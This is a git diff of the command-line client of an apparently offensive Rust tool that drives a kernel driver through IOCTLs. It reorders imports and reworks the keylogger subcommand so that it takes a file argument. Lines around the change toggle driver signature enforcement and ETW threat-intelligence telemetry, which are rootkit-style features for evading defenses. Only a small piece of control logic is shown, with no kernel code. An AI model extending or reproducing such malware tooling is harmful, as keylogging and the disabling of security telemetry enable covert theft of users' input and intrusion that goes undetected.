@@ -1,9 +1,9 @@
 use {
     cli::*, 
-    log::*, 
-    clap::Parser,  
+    log::*,  
     shared::ioctls::*,
     utils::init_logger,
+    clap::Parser,
 };
 use modules::{
     misc::Misc,
@@ -21,6 +21,7 @@ use modules::registry::Registry;
 
 mod cli;
 mod modules;
+#[macro_use]
 mod utils;
 
 fn main() {
@@ -117,12 +118,8 @@ fn main() {
                         misc.dse(IOCTL_ENABLE_DSE, false);
                     }
                 }
-                MisCommands::Keylogger { stop, start } => {
-                    if *start {
-                        misc.keylogger(IOCTL_KEYLOGGER, true);
-                    } else if *stop {
-                        misc.keylogger(IOCTL_KEYLOGGER, false);
-                    }
+                MisCommands::Keylogger { file } => {
+                    misc.keylogger(IOCTL_KEYLOGGER, file);
                 }
                 MisCommands::Etwti { disable, enable } => {
                     if *enable {
